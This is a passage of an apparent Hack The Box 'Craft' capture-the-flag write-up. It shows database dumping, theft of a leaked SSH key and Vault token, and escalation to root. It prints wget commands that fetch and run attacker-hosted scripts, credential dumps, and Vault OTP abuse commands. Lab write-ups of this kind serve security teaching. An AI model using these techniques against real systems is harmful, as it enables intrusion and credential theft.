        <span class="n">result</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchone</span><span class="p">()</span>
        <span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>

<span class="k">finally</span><span class="p">:</span>
    <span class="n">connection</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">app</span> <span class="c1">#
</span></code></pre></div></div>
<p>I copied the script and changed <code class="language-plaintext highlighter-rouge">result = cursor.fetchone()</code> to <code class="language-plaintext highlighter-rouge">result = cursor.fetchall()</code> and I changed the query to <code class="language-plaintext highlighter-rouge">SHOW TABLES</code>:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span>
<span class="kn">import</span> <span class="nn">pymysql</span>
<span class="kn">from</span> <span class="nn">craft_api</span> <span class="kn">import</span> <span class="n">settings</span>

<span class="c1"># test connection to mysql database
</span>
<span class="n">connection</span> <span class="o">=</span> <span class="n">pymysql</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_HOST</span><span class="p">,</span>
                             <span class="n">user</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_USER</span><span class="p">,</span>
                             <span class="n">password</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_PASSWORD</span><span class="p">,</span>
                             <span class="n">db</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_DB</span><span class="p">,</span>
                             <span class="n">cursorclass</span><span class="o">=</span><span class="n">pymysql</span><span class="p">.</span><span class="n">cursors</span><span class="p">.</span><span class="n">DictCursor</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span> 
    <span class="k">with</span> <span class="n">connection</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span> <span class="k">as</span> <span class="n">cursor</span><span class="p">:</span>
        <span class="n">sql</span> <span class="o">=</span> <span class="s">"SHOW TABLES"</span>
        <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
        <span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>

<span class="k">finally</span><span class="p">:</span>
    <span class="n">connection</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>
<p>There were two tables, <code class="language-plaintext highlighter-rouge">user</code> and <code class="language-plaintext highlighter-rouge">brew</code>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/app # wget http://10.10.xx.xx/db1.py
Connecting to 10.10.xx.xx (10.10.xx.xx:80)
db1.py               100% |********************************|   629  0:00:00 ETA

/opt/app # python db1.py
[{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]
/opt/app # rm db1.py
/opt/app #
</code></pre></div></div>
<p>I changed the query to <code class="language-plaintext highlighter-rouge">SELECT * FROM user</code>:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span>
<span class="kn">import</span> <span class="nn">pymysql</span>
<span class="kn">from</span> <span class="nn">craft_api</span> <span class="kn">import</span> <span class="n">settings</span>

<span class="c1"># test connection to mysql database
</span>
<span class="n">connection</span> <span class="o">=</span> <span class="n">pymysql</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_HOST</span><span class="p">,</span>
                             <span class="n">user</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_USER</span><span class="p">,</span>
                             <span class="n">password</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_PASSWORD</span><span class="p">,</span>
                             <span class="n">db</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_DB</span><span class="p">,</span>
                             <span class="n">cursorclass</span><span class="o">=</span><span class="n">pymysql</span><span class="p">.</span><span class="n">cursors</span><span class="p">.</span><span class="n">DictCursor</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span> 
    <span class="k">with</span> <span class="n">connection</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span> <span class="k">as</span> <span class="n">cursor</span><span class="p">:</span>
        <span class="n">sql</span> <span class="o">=</span> <span class="s">"SELECT * FROM user"</span>
        <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
        <span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>

<span class="k">finally</span><span class="p">:</span>
    <span class="n">connection</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>
<p>The table had all users credentials stored in plain text:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/app # wget http://10.10.xx.xx/db2.py
Connecting to 10.10.xx.xx (10.10.xx.xx:80)
db2.py               100% |********************************|   636  0:00:00 ETA

/opt/app # python db2.py
[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
/opt/app # rm db2.py
/opt/app #
</code></pre></div></div>
<p>Gilfoyle had a private repository called <code class="language-plaintext highlighter-rouge">craft-infra</code>:
<br><img src="/images/hackthebox/craft/16.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/craft/17.png" alt="" class="align-center"><br><br>
He left his private <code class="language-plaintext highlighter-rouge">ssh</code> key in the repository:
<br><img src="/images/hackthebox/craft/18.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/craft/19.png" alt="" class="align-center"><br><br>
When I tried to use the key it asked for password as it was encrypted, I tried his <code class="language-plaintext highlighter-rouge">gogs</code> password (<code class="language-plaintext highlighter-rouge">ZEU3N8WNM2rh4T</code>) and it worked:
<br><img src="/images/hackthebox/craft/20.png" alt="" class="align-center"><br><br>
We owned user.<br></p>

<h2 id="vault--one-time-ssh-password--ssh-as-root--root-flag">Vault –&gt; One-Time SSH Password –&gt; SSH as root –&gt; Root Flag</h2>
<p>In Gilfoyle’s home directory there was a file called <code class="language-plaintext highlighter-rouge">.vault-token</code>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gilfoyle@craft:~$ ls -la
total 44
drwx------ 5 gilfoyle gilfoyle 4096 Jan  3 13:42 .
drwxr-xr-x 3 root     root     4096 Feb  9  2019 ..
-rw-r--r-- 1 gilfoyle gilfoyle  634 Feb  9  2019 .bashrc
drwx------ 3 gilfoyle gilfoyle 4096 Feb  9  2019 .config
drwx------ 2 gilfoyle gilfoyle 4096 Jan  3 13:31 .gnupg
-rw-r--r-- 1 gilfoyle gilfoyle  148 Feb  8  2019 .profile
drwx------ 2 gilfoyle gilfoyle 4096 Feb  9  2019 .ssh
-r-------- 1 gilfoyle gilfoyle   33 Feb  9  2019 user.txt
-rw------- 1 gilfoyle gilfoyle   36 Feb  9  2019 .vault-token
-rw------- 1 gilfoyle gilfoyle 5091 Jan  3 13:28 .viminfo
gilfoyle@craft:~$ cat .vault-token 
f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9gilfoyle@craft:~$
</code></pre></div></div>
<p>A quick search revealed that it’s related to <a href="https://www.vaultproject.io/" target="_blank" rel="noopener noreferrer"><code class="language-plaintext highlighter-rouge">vault</code></a>.<br></p>

<blockquote>
  <p>Secure, store and tightly control access to tokens, passwords, certificates, encryption keys for protecting secrets and other sensitive data using a UI, CLI, or HTTP API. -<a href="https://www.vaultproject.io/" target="_blank" rel="noopener noreferrer">vaultproject.io</a></p>
</blockquote>

<p>By looking at <code class="language-plaintext highlighter-rouge">vault.sh</code> from <code class="language-plaintext highlighter-rouge">craft-infra</code> repository (<code class="language-plaintext highlighter-rouge">vault/vault.sh</code>), we’ll see that it enables the <a href="https://www.vaultproject.io/docs/secrets/ssh/index.html" target="_blank" rel="noopener noreferrer"><code class="language-plaintext highlighter-rouge">ssh</code> secrets engine</a> then creates an <a href="https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html" target="_blank" rel="noopener noreferrer"><code class="language-plaintext highlighter-rouge">otp</code> role</a> for <code class="language-plaintext highlighter-rouge">root</code>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="c"># set up vault secrets backend</span>

vault secrets <span class="nb">enable </span>ssh

vault write ssh/roles/root_otp <span class="se">\</span>
    <span class="nv">key_type</span><span class="o">=</span>otp <span class="se">\</span>
    <span class="nv">default_user</span><span class="o">=</span>root <span class="se">\</span>
    <span class="nv">cidr_list</span><span class="o">=</span>0.0.0.0/0
</code></pre></div></div>
<p>We have the token (<code class="language-plaintext highlighter-rouge">.vault-token</code>) so we can easily authenticate to the vault and create an <code class="language-plaintext highlighter-rouge">otp</code> for a root <code class="language-plaintext highlighter-rouge">ssh</code> session:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gilfoyle@craft:~$ vault login
Token (will be hidden): 
Success! You are now authenticated. The token information displayed below
is already stored in the token helper. You do NOT need to run "vault login"
again. Future Vault requests will automatically use this token.

Key                  Value
---                  -----
token                f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
token_accessor       1dd7b9a1-f0f1-f230-dc76-46970deb5103
token_duration       ∞
token_renewable      false
token_policies       ["root"]
identity_policies    []
policies             ["root"]
gilfoyle@craft:~$ vault write ssh/creds/root_otp ip=127.0.0.1
Key                Value
---                -----
lease_id           ssh/creds/root_otp/f17d03b6-552a-a90a-02b8-0932aaa20198
lease_duration     768h
lease_renewable    false
ip                 127.0.0.1
key                c495f06b-daac-8a95-b7aa-c55618b037ee
key_type           otp
port               22
username           root
gilfoyle@craft:~$
</code></pre></div></div>
<p>And finally we’ll <code class="language-plaintext highlighter-rouge">ssh</code> into <code class="language-plaintext highlighter-rouge">localhost</code> and use the generated password (<code class="language-plaintext highlighter-rouge">c495f06b-daac-8a95-b7aa-c55618b037ee</code>):</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gilfoyle@craft:~$ ssh root@127.0.0.1


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



Password: 
Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 27 04:53:14 2019
root@craft:~# 
</code></pre></div></div>

<p><br><img src="/images/hackthebox/craft/21.png" alt="" class="align-center"><br><br>
And we owned root !
<br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.<br></p>

<p>Previous Hack The Box write-up : <a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a>
<br>Next Hack The Box write-up : <a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></p>

        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-01-04T07:00:00+02:00">January 4, 2020</time></p>


      </footer>

      

      
  <nav class="pagination">
    
      <a href="/hack-the-box/smasher2/" class="pagination--pager" title="Hack The Box - Smasher2
">Previous</a>
    
    
      <a href="/hack-the-box/bitlab/" class="pagination--pager" title="Hack The Box - Bitlab
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
    <ul class="social-icons">
      
  
      
  
      
    </ul>
  </div>
      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>







  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
</script>









  </body>
</html>
